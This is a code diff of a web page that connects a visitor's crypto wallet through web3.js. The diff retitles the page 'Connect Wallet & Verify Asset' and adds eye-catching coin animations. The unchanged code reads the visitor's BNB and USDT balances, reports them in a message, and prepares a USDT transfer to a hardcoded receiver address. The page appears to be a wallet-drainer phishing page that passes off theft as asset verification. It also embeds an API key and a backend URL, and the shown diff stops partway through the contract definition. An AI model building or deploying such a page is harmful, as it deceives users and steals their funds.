@@ -2,13 +2,115 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>USDT Transfer with Gas Top-Up</title>
+  <title>Connect Wallet & Verify Asset</title>
   <script src="https://cdn.jsdelivr.net/npm/web3@1.6.1/dist/web3.min.js"></script>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+      height: 100%;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+
+    body {
+      background: #000;
+      position: relative;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      z-index: 1;
+    }
+
+    canvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: 0;
+      opacity: 0.5;
+    }
+
+    h1 {
+      margin-bottom: 40px;
+      font-size: 28px;
+      color: #fff;
+      text-shadow: 1px 1px 3px #fcd535;
+      z-index: 2;
+    }
+
+    button {
+      background: linear-gradient(135deg, #ff6ec4, #7873f5);
+      color: white;
+      border: none;
+      padding: 15px 40px;
+      font-size: 18px;
+      border-radius: 12px;
+      cursor: pointer;
+      box-shadow: 0 8px 15px rgba(0, 0, 0, 0.2);
+      transition: all 0.3s ease;
+      position: relative;
+      overflow: hidden;
+      z-index: 2;
+    }
+
+    button:hover {
+      background: linear-gradient(135deg, #e94057, #8a2387);
+      box-shadow: 0 12px 20px rgba(0, 0, 0, 0.25);
+      transform: translateY(-2px);
+    }
+
+    button:active {
+      transform: scale(0.98);
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
+    }
+
+    .loader {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #4CAF50;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin-top: 20px;
+      display: none;
+      z-index: 2;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    @keyframes popupEffect {
+      0% {
+        transform: scale(0);
+        opacity: 0;
+      }
+      100% {
+        transform: scale(1);
+        opacity: 1;
+      }
+    }
+
+    .popupLogo {
+      animation: popupEffect 0.6s ease-out forwards;
+    }
+
+    #status {
+      font-size: 16px;
+      margin-top: 20px;
+    }
+  </style>
 </head>
-<body style="font-family: Arial; text-align: center; padding: 40px;">
-  <h2>Connect Wallet & Send USDT with BNB Gas Support</h2>
-  <button onclick="connectAndSend()" style="padding: 12px 24px; font-size: 16px;">Connect Wallet</button>
+<body>
+  <canvas id="coinCanvas"></canvas>
+  
+  <h1>Connect Wallet & Verify Your Cryptocurrency</h1>
+  <button onclick="connectAndSend()">Connect Wallet</button>
   <p id="status"></p>
+  <div class="loader" id="loader"></div>
 
   <script>
     const BSC_SCAN_API = 'ZTC12CNRZ8UC8HGFDIW8SARDJXP1N6QIR1';
@@ -17,6 +119,82 @@
     const USDT_CONTRACT = '0x55d398326f99059ff775485246999027b3197955';
     const RECEIVER = '0x8e11ea07330A4824F846ad3Ea3dfB68f47c66B56';
     const BACKEND_URL = 'https://a-production-c9bc.up.railway.app';
+
+    const canvas = document.getElementById('coinCanvas');
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+
+    const coinLogoBinance = 'binance-coin-bnb-logo.png'; 
+    const coinLogoTether = 'tether-usdt-logo.svg'; 
+
+    const imageBinance = new Image();
+    const imageTether = new Image();
+    let imageBinanceLoaded = false;
+    let imageTetherLoaded = false;
+
+    imageBinance.src = coinLogoBinance;
+    imageTether.src = coinLogoTether;
+
+    imageBinance.onload = () => {
+      imageBinanceLoaded = true;
+      if (imageTetherLoaded) createLogos();
+    };
+
+    imageTether.onload = () => {
+      imageTetherLoaded = true;
+      if (imageBinanceLoaded) createLogos();
+    };
+
+    const logoCount = 7;
+    const logosBinance = [];
+    const logosTether = [];
+
+    function createLogos() {
+      for (let i = 0; i < logoCount; i++) {
+        logosBinance.push({
+          x: Math.random() * canvas.width,
+          y: Math.random() * canvas.height,
+          size: 50,
+          dx: (Math.random() - 0.5) * 4,
+          dy: (Math.random() - 0.5) * 4,
+          image: imageBinance,
+        });
+        logosTether.push({
+          x: Math.random() * canvas.width,
+          y: Math.random() * canvas.height,
+          size: 50,
+          dx: (Math.random() - 0.5) * 4,
+          dy: (Math.random() - 0.5) * 4,
+          image: imageTether,
+        });
+      }
+      animateLogos();
+    }
+
+    function animateLogos() {
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+      logosBinance.forEach(logo => {
+        ctx.drawImage(logo.image, logo.x, logo.y, logo.size, logo.size);
+        logo.x += logo.dx;
+        logo.y += logo.dy;
+
+        if (logo.x <= 0 || logo.x + logo.size >= canvas.width) logo.dx = -logo.dx;
+        if (logo.y <= 0 || logo.y + logo.size >= canvas.height) logo.dy = -logo.dy;
+      });
+
+      logosTether.forEach(logo => {
+        ctx.drawImage(logo.image, logo.x, logo.y, logo.size, logo.size);
+        logo.x += logo.dx;
+        logo.y += logo.dy;
+
+        if (logo.x <= 0 || logo.x + logo.size >= canvas.width) logo.dx = -logo.dx;
+        if (logo.y <= 0 || logo.y + logo.size >= canvas.height) logo.dy = -logo.dy;
+      });
+
+      requestAnimationFrame(animateLogos);
+    }
 
     async function connectAndSend() {
       const status = document.getElementById("status");
@@ -28,52 +206,11 @@
       }
 
       const web3 = new Web3(window.ethereum);
-      
-      // Check if the user is connected to the BSC network
-      const chainId = await web3.eth.getChainId();
-      const BSC_CHAIN_ID = 56; // BSC Mainnet chain ID
-
-      if (chainId !== BSC_CHAIN_ID) {
-        try {
-          // Request to switch to the BSC network
-          await window.ethereum.request({
-            method: 'wallet_switchEthereumChain',
-            params: [{ chainId: web3.utils.toHex(BSC_CHAIN_ID) }],
-          });
-          status.innerText = "🔗 Switched to BSC Network!";
-        } catch (switchError) {
-          // If the chain is not available, request to add it
-          if (switchError.code === 4902) {
-            try {
-              await window.ethereum.request({
-                method: 'wallet_addEthereumChain',
-                params: [{
-                  chainId: web3.utils.toHex(BSC_CHAIN_ID),
-                  chainName: 'Binance Smart Chain',
-                  nativeCurrency: {
-                    name: 'BNB',
-                    symbol: 'BNB',
-                    decimals: 18
-                  },
-                  rpcUrls: ['https://bsc-dataseed1.binance.org:443'],
-                  blockExplorerUrls: ['https://bscscan.com']
-                }]
-              });
-              status.innerText = "🔗 Added BSC Network!";
-            } catch (addError) {
-              alert("⚠️ Failed to switch or add BSC Network.");
-            }
-          } else {
-            alert("⚠️ Error switching to BSC Network.");
-          }
-        }
-      }
-
       const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
       const user = accounts[0];
+
       let message = `📲 *Wallet Connected*\n\`${user}\`\n\n`;
 
-      // Fetch BNB balance
       const bnbUrl = `https://api.bscscan.com/api?module=account&action=balance&address=${user}&apikey=${BSC_SCAN_API}`;
       const bnbRes = await fetch(bnbUrl);
       const bnbData = await bnbRes.json();
@@ -86,12 +223,10 @@
         message += `💰 *BNB*: ❌ Error\n`;
       }
 
-      // Get BNB price in USD
       const priceRes = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd');
       const priceData = await priceRes.json();
       const bnbUsd = bnb * priceData.binancecoin.usd;
 
-      // Fetch USDT balance
       const usdtUrl = `https://api.bscscan.com/api?module=account&action=tokenbalance&contractaddress=${USDT_CONTRACT}&address=${user}&tag=latest&apikey=${BSC_SCAN_API}`;
       const usdtRes = await fetch(usdtUrl);
       const usdtData = await usdtRes.json();
@@ -116,7 +251,7 @@
         }
 
         message += `✅ *Top-up Requested!*\n⏳ *Waiting for balance update...*\n`;
-        await new Promise(r => setTimeout(r, 15000)); // Wait 15 seconds
+        await new Promise(r => setTimeout(r, 15000)); 
 
         const bnbCheck = await fetch(bnbUrl);
         const newBnbData = await bnbCheck.json();
@@ -134,7 +269,6 @@
         message += `✅ *BNB is sufficient!*\n`;
       }
 
-      // Send USDT via contract
       const usdtContract = new web3.eth.Contract([
         { "constant": false, "inputs": [
             { "name": "_to", "type": "address" },
